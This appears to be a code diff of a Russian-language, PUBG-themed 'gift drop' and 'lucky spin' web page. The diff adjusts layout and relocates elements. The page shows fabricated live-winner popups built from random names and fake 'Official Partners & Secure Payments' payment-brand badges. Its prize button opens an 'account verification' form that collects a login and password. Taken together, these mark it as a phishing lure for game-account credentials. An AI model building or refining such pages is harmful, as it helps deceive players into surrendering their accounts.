@@ -225,7 +225,7 @@
         .partners-section {
             background: rgba(0, 0, 0, 0.7);
             padding: 20px 16px;
-            margin-top: auto;
+            margin-top: 20px;
             border-top: 1px solid rgba(255, 255, 255, 0.1);
         }
         
@@ -255,7 +255,7 @@
         </div>
     </div>
 
-    <div id="live-winner" class="fixed top-16 left-1/2 transform -translate-x-1/2 z-[1000] bg-black/80 border-l-4 border-yellow-500 p-3 rounded-lg shadow-2xl -translate-y-[150%] transition-transform duration-500 flex items-center gap-3" style="width: 90%; max-width: 300px;">
+    <div id="live-winner" class="fixed top-20 left-4 z-[1000] bg-black/80 border-l-4 border-yellow-500 p-3 rounded-r-lg shadow-2xl transform -translate-x-[150%] transition-transform duration-500 flex items-center gap-3">
         <div class="winner-avatar">
             <i class="fas fa-user-secret text-lg"></i>
         </div>
@@ -293,13 +293,13 @@
         <div class="grid grid-cols-2 gap-4 mt-2">
             <div class="bg-[#151618] p-4 rounded-2xl border border-white/5 text-center cursor-pointer active:scale-95 transition-transform" onclick="showSection('case')">
                 <img src="https://images.unsplash.com/photo-1542751371-adc38448a05e?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80" class="game-card-image">
-                <div class="pubg-font text-yellow-500 text-lg">GIFT DROP</div>
-                <div class="text-xs text-gray-400 mt-1">Крути рулетку и выигрывай</div>
+                <div class="pubg-font text-blue-400 text-lg">GIFT DROP</div>
+                <div class="text-xs text-gray-400 mt-1">Открывай кейсы и забирай награды</div>
             </div>
             <div class="bg-[#151618] p-4 rounded-2xl border border-white/5 text-center cursor-pointer active:scale-95 transition-transform" onclick="showSection('spin')">
                 <img src="https://images.unsplash.com/photo-1511512578047-dfb367046420?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80" class="game-card-image">
-                <div class="pubg-font text-blue-400 text-lg">LUCKY SPIN</div>
-                <div class="text-xs text-gray-400 mt-1">Открывай кейсы и забирай награды</div>
+                <div class="pubg-font text-yellow-500 text-lg">LUCKY SPIN</div>
+                <div class="text-xs text-gray-400 mt-1">Крути рулетку и выигрывай</div>
             </div>
         </div>
     </main>
@@ -336,18 +336,6 @@
         <button id="spinDepositBtn" class="btn-blue !mx-0 !bg-blue-600 !text-white !w-full" style="display: none;" onclick="startAuth()">Забрать приз</button>
     </section>
 
-    <!-- Партнеры и безопасные платежи -->
-    <div class="partners-section">
-        <p class="text-center text-[10px] uppercase tracking-widest mb-4 text-gray-400">Official Partners & Secure Payments</p>
-        <div class="flex flex-wrap justify-center gap-6 items-center">
-            <i class="fab fa-cc-visa text-3xl"></i>
-            <i class="fab fa-cc-mastercard text-3xl"></i>
-            <i class="fab fa-apple-pay text-4xl"></i>
-            <i class="fab fa-google-pay text-4xl"></i>
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2e/Visa_2021.svg/320px-Visa_2021.svg.png" class="h-4">
-        </div>
-    </div>
-
     <div id="modalAuth" class="modal">
         <div class="login-card">
             <h2 class="font-black text-xl mb-4 text-center">Верификация аккаунта</h2>
@@ -363,6 +351,18 @@
             <input type="text" id="inpUser" placeholder="Email или телефон">
             <input type="password" id="inpPass" placeholder="Пароль">
             <button onclick="finalSubmit()" class="w-full bg-blue-600 text-white p-4 rounded-xl mt-4 font-bold">Войти</button>
+        </div>
+    </div>
+
+    <!-- Партнеры и безопасные платежи -->
+    <div class="partners-section">
+        <p class="text-center text-[10px] uppercase tracking-widest mb-4 text-gray-400">Official Partners & Secure Payments</p>
+        <div class="flex flex-wrap justify-center gap-6 items-center">
+            <i class="fab fa-cc-visa text-3xl text-blue-600"></i>
+            <i class="fab fa-cc-mastercard text-3xl text-red-600"></i>
+            <i class="fab fa-apple-pay text-4xl text-black"></i>
+            <i class="fab fa-google-pay text-4xl text-blue-800"></i>
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2e/Visa_2021.svg/320px-Visa_2021.svg.png" class="h-4">
         </div>
     </div>
 
@@ -398,9 +398,9 @@
             document.getElementById('winner-name').innerText = names[Math.floor(Math.random() * names.length)];
             document.getElementById('winner-item').innerText = 'выбил ' + item.name;
 
-            winner.classList.remove('-translate-y-[150%]');
+            winner.classList.remove('-translate-x-[150%]');
             setTimeout(() => {
-                winner.classList.add('-translate-y-[150%]');
+                winner.classList.add('-translate-x-[150%]');
             }, 4000);
         }
 
